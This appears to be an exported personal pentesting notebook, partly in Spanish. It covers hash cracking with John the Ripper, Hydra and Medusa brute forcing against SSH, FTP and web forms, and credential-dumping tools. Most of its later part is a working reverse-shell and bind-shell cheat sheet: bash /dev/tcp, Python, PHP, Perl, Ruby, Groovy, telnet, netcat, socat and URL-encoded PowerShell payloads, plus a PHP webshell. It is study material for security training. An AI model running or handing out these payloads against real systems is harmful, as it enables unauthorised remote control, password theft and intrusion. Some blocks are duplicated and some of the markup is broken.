wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
```

launch
```shell
python3 hash-id.py
```

[[Networking/Seguridad en redes/Hardening de dispositivos de red/Hash types\|Hash types]]
# Format-Specific Cracking
md5 as in the example above, you have to prefix it with `raw-`
```shell
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

list all of John's formats

	john --list=formats
especific with grep

	john --list=formats | grep -iF "md5"

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```sh
sudo john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



ry and work out possible passwords heuristically, by slightly changing the letters and numbers contained within the username. This is **word mangling**.

Gecos: /etc/shadow and /etc/passwd? Well if you look closely You can see that each field is seperated by a colon ":". Each one of the fields that these records are split into are called Gecos fields.

``` bash
john --single --format=[format] [path to file]
```

File hash format user:hash

``` bash
mike:1efee03cdcb96d90ad48ccc7b8666033
```

# Custom rules
Custom rules are defined in the `john.conf` file, usually located in `/etc/john/john.conf` if you have installed John using a package manager or built from source with `make` and in `/opt/john/john.conf`.
syntax on https://www.openwall.com/john/doc/RULES.shtml


`[List.Rules:THMRules]` - Is used to define the name of your rule
`Az` - Takes the word and appends it with the characters you define  
`A0` - Takes the word and prepends it with the characters you define  
`c` - Capitalises the character positionally

what characters should be appended, prepended or otherwise include, adding adding in `[ ]` inside of double quotes `" "` 

`[0-9]` - Will include numbers 0-9  
`[0]` - Will include only the number 0  
`[A-z]` - Will include both upper and lowercase  
`[A-Z]` - Will include only uppercase letters  
`[a-z]` - Will include only lowercase letters  
`[a]` - Will include only a  
`[!£$%@]` - Will include the symbols !£$%@

generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:

``` john
[List.Rules:PoloPassword]
cAz"[0-9] [!£$%@]"
```
Capitalise the first  letter - `c`
Append to the end of the word - `Az`
A number in the range 0-9 - `[0-9]`
Followed by a symbol that is one of `[!£$%@]`

call this custom rule
`--rule=PoloPassword`

As a full command:
```
john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
```

add all capital letters to the end of the word
```
Az"[A-Z]"
```



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Zip2John

`zip2john [options] [zip file] > [output file]   `

`[options]` - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary  

`[zip file]` - The path to the zip file you wish to get the hash of

`>` - This is the output director, we're using this to send the output from this file to the...  

`[output file]` - This is the file that will store the output from

	zip2john zipfile.zip > zip_hash.txt

crack
``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



#### Rar2John

Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:  

`rar2john [rar file] > [output file]   `

`rar2john` - Invokes the rar2john tool  

`[rar file]` - The path to the rar file you wish to get the hash of

`>` - This is the output director, we're using this to send the output from this file to the...  

`[output file]` - This is the file that will store the output from

**Example Usage**

rar2john rarfile.rar > rar_hash.txt

#### Cracking

`john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt`

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
```sh
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```
Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the `ssh2john` command with `python3 /opt/ssh2john.py` or on Kali, `python /usr/share/john/ssh2john.py`.
```sh
ssh2john [id_rsa private key file] > [output file]
```

ssh2john - Invokes the ssh2john tool  

`[id_rsa private key file]` - The path to the id_rsa file you wish to get the hash of

`>` - This is the output director, we're using this to send the output from this file to the...  

`[output file]` - This is the file that will store the output from

**Example Usage**
ssh2john id_rsa > id_rsa_hash.txt

**Cracking**

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Convert a .asc to hash to next crack with johntheripper
```sh
gpg2john tryhackme.asc > hash
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Create a hash from ssh key

	python ssh2john.oy secretkey > secret.hash

Get the passphrase with john using a dic.txt and the hash above

	sudo opt/john/john secret.hash --wordlist=dic.txt

</div></div>


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Crack pass with pass dic

| Option               | Description                                                                          |
| -------------------- | ------------------------------------------------------------------------------------ |
| `-l`                 | specifies the (SSH) **username** for login                                           |
| `-P`                 | indicates a **list of passwords**                                                    |
| `-t`                 | sets the number of **threads** to spawn                                              |
| `-L`                 | indicates a **list of users**                                                        |
| `-p`                 | specifies the (SSH) **password** for login                                           |
| `-s`                 | **port** number                                                                      |
| `-V`                 | verbose output for every attempt                                                     |
| `-vV`                | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| `-f`                 | stops Hydra after finding a working password                                         |
| `http-post-form`     | the type of the form is POST                                                         |
| `<path>`             | the login page URL, for example, `login.php`                                         |
| `<invalid_response>` | part of the response when the login fails                                            |
## SSH
``` sh
hydra -l john -P dic.txt ssh://IP
```
``` sh
hydra -l john -P dic.txt IP ssh
```
## FTP
```sh
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```
## Post Web Form
We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
```shell
sudo hydra <username> <wordlist> 10.10.181.239 http-post-form "<path>:<login_credentials>:invalid_response>"
```

### POST login form:
```shell
hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails
---
![Pasted image 20231206174317.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020231206174317.png)
```sh
hydra -l '' -P 3digits.txt -f -v 10.10.180.149 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.180.149` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target

</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Brute force
```sh
medusa -h IP -U users.txt -P passwords.txt -M service
```

| Option             | Description               |
| ------------------ | ------------------------- |
| `-h IP`            | Set Ip address            |
| `-U users_or_file` | Set user or list of users |
| `-P Pass`          | Set passwords or file     |
| `-M service`       | Set service               |


</div></div>

# Others
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## No electronics
Social ingenni
Dumpers diving
Shoulder surfing
Baiting
	extern memory to download passwords
## Active online
Dictionary
Brute force
Hash inyection
Troyano, Malware, Virus
Key loggers

Default passwords
	https://www.fortypoundhead.com
	https://cirt.net
	http://www.defaultpassword.us
	http://defaultpasswords.in
	https://www.routerpasswords.com
	https://default -password.info
## Pasive online
Wire sniffing
	get from captures of traffic
MITM
	man in the middle
Replay attack
DNA
	Disturben net attack
## Offline
Disturbed network attacks
Rainbow table attacks

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



accessdata.com
passware.com
hashcat.com
windowspasswordsrecovery.com
top-password.com
ophcrack - windows tool
	load pwdump file
	load hashex.txt (with ::: at the final)
	open tables
	vista free
	install
	Select folder c:/opencrack/x86/tables_vista_free
	Crack

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



mimikats
powershell Empire
DSInternals Powershell
Ntdsxtract
pwdump
	windows tool
	pwdump8.exe > c:/hashes.txt

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Autitions
Don't allow same pswd while changing pswd
Don't allow shared pswd
Don't use dics pswd
Change each 30 days


</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- "Swiss Army Knife" of networking.
- Perform all kinds of network interactions.
- Support [[Networking/TCP\|TCP]] and [[Networking/UDP\|UDP]]
- Used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
- If you choose to use a **port below 1024**, you will need to use `sudo` when starting your listener.
- It's **good idea** to **use** a **well-known** port number (**80, 443 or 53** being good choices) as this is more likely to get **past** outbound **firewall rules** on the target.

| Command | Description                                                                        |
| ------- | ---------------------------------------------------------------------------------- |
| -l      | is used to tell netcat that this will be a listener                                |
| -n      | tells netcat not to resolve host names or use DNS. avoid DNS lookups and warnings. |
| -v      | is used to request a verbose output                                                |
| -p      | indicates that the port specification will follow.                                 |
| -vv     | Very Verbose (optional)                                                            |
| -k      | Keep listening after client disconnects                                            |
## Reverse shell
### On the target
#### nc basic bash
##### Linux
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
```sh
nc <LOCAL-IP> <PORT> -e /bin/bash
```
##### Windows
**Command Prompt**
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
> ```

this is **not included in most versions of netcat** as it is widely seen to be very insecure **so**:
#### Create a [[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
#### Powershell reverse shell
It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a **webshell**)
```sh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```sh
powershell+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.13.41.201',4747)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```

```sh
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5
```
### On the attacker
with rlwrap to simulate an interactive console
``` sh
rlwrap nc -lnvp 47
```

65535 total number of ports
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
port 30000
```bash
nc localhost 4747
```

ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```
## Bind shell
### On the target(listener)
```bash
nc -lnvp <port> -e /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
### On the attacker
```bash
nc <target-ip> <chosen-port>
```
## Shell stabilization
### Technique 1: Python
1. Uses Python to spawn a better featured bash shell;
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
some targets may need replace `python` with `python2` or `python3`
2. access to term commands such as `clear`.
```sh
export TERM=xterm
```
3. Background the shell using Ctrl + Z.
```sh
stty raw -echo; fg
```
This does two things: 
- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- then **foregrounds the shell,** thus completing the process.
- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.
### Technique 2: rlwrap
- Rlwrap is a program which, in simple terms, gives us **access to history**, **tab autocompletion** and the **arrow keys** immediately upon receiving a shell
``` sh
rlwrap nc -lnvp <port>
```
- particularly useful when dealing with Windows shells
- On Linux target, it's possible to completely stabilise,
- using Ctrl + Z.
```sh
stty raw -echo; fg
```
### Technique 3: [[socat\|Socat]]
### Technique 4: [[Operative System/Linux/Commands/SSH\|SSH]]

### Extra 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- On my machine to get info from stty
```sh
stty -a
```
- Next, in your reverse/bind shell, type in:
`stty rows <number>`  
and
`stty cols <number>`


</div></div>

 

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Netcat on steroids.
- Socat shells are **usually more stable** than netcat shells.
- Both have .exe versions.
- two big catches:
	1. The syntax is more difficult
	2. Socat is very rarely installed by default.
- Limited to **Linux target**
- on Windows will be no more stable than a netcat shell.
1. On the attacker download the file
```sh
   wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
   ```
   and set a python server
   ```sh
   sudo python3 -m http.server 80
   ```
2. On the target, get the file
	```sh
	wget <LOCAL-IP>/socat -O /tmp/socat
	```
	On windows
	```sh
	Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
	```
## Reverse shell
### On the attacker
basic reverse shell listener
```sh
socat TCP-L:<port> -
```
### On the target
#### Windows
On **Windows** we would use this command to connect back:
```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
#### Linux
This is the equivalent command for a **Linux** Target:
```sh
socat TCP:<attacker-IP>:<attacker-PORT> EXEC:"bash -li"
```
### Fully stable Linux tty reverse shell
#### On the attacker 
This will only **work when the target is Linux**, but is _significantly_ more stable.
Perhaps one of its most useful applications.
```sh
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
- The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command.
- This means that the target must have socat installed.
- Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
#### On the target
```sh
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- The first part  we're linking up with the listener running on our own machine.
- The second part creates an interactive bash session with  `EXEC:"bash -li"`.
- We're also passing the arguments: pty, stderr, sigint, setsid and sane:
	- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
	- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
	- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
	- **setsid**, creates the process in a new session
	- **sane**, stabilises the terminal, attempting to "normalise" it.
- As normal, on the **left** we have a **listener** running on our local **attacking machine**, on the **right** we have a simulation of a compromised **target**, running with a **non-interactive shell**. **Using the non-interactive** netcat **shell**, we **execute** the special **socat** command, and **receive a** fully **interactive** bash shell on the socat listener to the left:
![](https://i.imgur.com/etAuYzz.png)
- Note that the **socat shell is fully interactive**, allowing us to use interactive commands such as **SSH**.
- This can then be further **improved by setting the stty values** as seen in the previous task, which will let us **use** text editors such as **Vim or Nano**.
- **If**, at any point, a socat shell **is not working correctly**, it's well worth increasing the verbosity by **adding** `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.
## Bind shell
### On the target
#### Linux
On a Linux target we would use the following command:
```sh
socat TCP-L:<PORT> EXEC:"bash -li"
```
#### Windows
On a Windows target we would use this command for our listener:
```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  
### On the attacker
Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
```sh
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
## Encrypted Shells
- **Cannot be spied** on unless you have the decryption key
- Are often able to **bypass an [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]** as a result.
- TCP should be replaced with `OPENSSL` when working with encrypted shells
- Generate a certificate
```sh
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
THis creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
will ask you to fill in information about the certificate, This can be left blank, or filled randomly.
- merge the two created files into a single `.pem` file:
```sh
cat shell.key shell.crt > shell.pem
```
### Reverse shell
- when we set up our reverse shell listener, we use:
```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
- This sets up an OPENSSL listener using our generated certificate
- `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
- Please note that the certificate _must_ be used on whichever device is listening.
To connect back, we would use:
```sh
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

- The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![](https://i.imgur.com/UbOPN9q.png)  
This technique will also **work** with the special, **Linux-only TTY shell** covered in the previous task -- figuring out the syntax for this will be the challenge for this task.
Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.
#### Example reverse shell full tty and encripted
Listenet
```sh
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```
Attacker:
```sh
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
### Bind shell
Target:
```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:
```sh
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.


</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Target is **forced to execute code** that connects _back_ to your computer.
- set up a _listener_ which would be used to receive the connection.
- good way to **bypass firewall** rules that may prevent you from connecting to arbitrary ports on the target
- **Permite** a un **atacante** conectarse a una máquina remota **desde una máquina de su propiedad**.
- Es decir, se establece una conexión **desde** la máquina **comprometida** **hacia** **la máquina del atacante**.
- Esto se logra **ejecutando un programa** malicioso o una instrucción específica **en la máquina remota** que **establece la conexión** de vuelta **hacia** la máquina del **atacante**, permitiéndole **tomar el control** de la máquina remota.
- **drawback** is that, when receiving a shell from a machine across the internet, you would **need to configure your own network** to accept the shell.
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Reverse shell
### On the target
#### nc basic bash
##### Linux
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
```sh
nc <LOCAL-IP> <PORT> -e /bin/bash
```
##### Windows
**Command Prompt**
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
> ```

this is **not included in most versions of netcat** as it is widely seen to be very insecure **so**:
#### Create a [[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
#### Powershell reverse shell
It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a **webshell**)
```sh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```sh
powershell+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.13.41.201',4747)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```

```sh
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5
```
### On the attacker
with rlwrap to simulate an interactive console
``` sh
rlwrap nc -lnvp 47
```

65535 total number of ports
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
port 30000
```bash
nc localhost 4747
```

ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```

</div></div>

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):
``` bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Python

This was tested under Linux / Python 2.7:

``` python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

``` bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### Test php webshell
On linux or windows
In a very basic one line format:
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

```php
/10.10.166.150/uploads/cmd1.php?cmd=command_to_execute
```
This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.
![Pasted image 20240512130724.png|500](/img/user/Pasted%20image%2020240512130724.png)
#### Linux
[[PentestMonkey php-reverse-shell linux\|PentestMonkey php-reverse-shell linux]]
They will not work on Windows by default.

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
#### Windows
[[php-reverse-shell linux\|php-reverse-shell linux]]

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

``` bash
	nc -e /bin/sh 10.0.0.1 1234
	nc -e /bin/bash 10.0.0.1 1234	
	nc -e /dev/tcp/ipattacker/443 0>&1
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### PERL
Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### Java

	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()

[Untested submission from anonymous reader]
### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

	xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

	Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):
	
	xhost +targetip


	export TERM=xterm
### Jenkins
Jenkins is an open-source automation server widely used in DevOps for building, testing, and deploying software applications.
Exec from console, accesing http on default port 8080
```Groovy
String host="attacking machine IP here";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Telnet
```sh
TF=$(mktemp -u);mkfifo $TF && telnet 10.13.41.201 4747 0<$TF | sh 1>$TF
```
### Cheatsheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Opuesto de la [[Operative System/Linux/Commands/Reverse shell\|Reverse Shell]]
- **En lugar** de que la máquina comprometida se conecte a la máquina del atacante, es el **atacante** quien **se conecta a la máquina comprometida**.
- **El atacante escucha** en un puerto determinado y **la máquina comprometida acepta la conexión** entrante en ese puerto.
- El atacante luego tiene **acceso por consola** a la máquina comprometida, lo que le permite tomar el control de la misma.
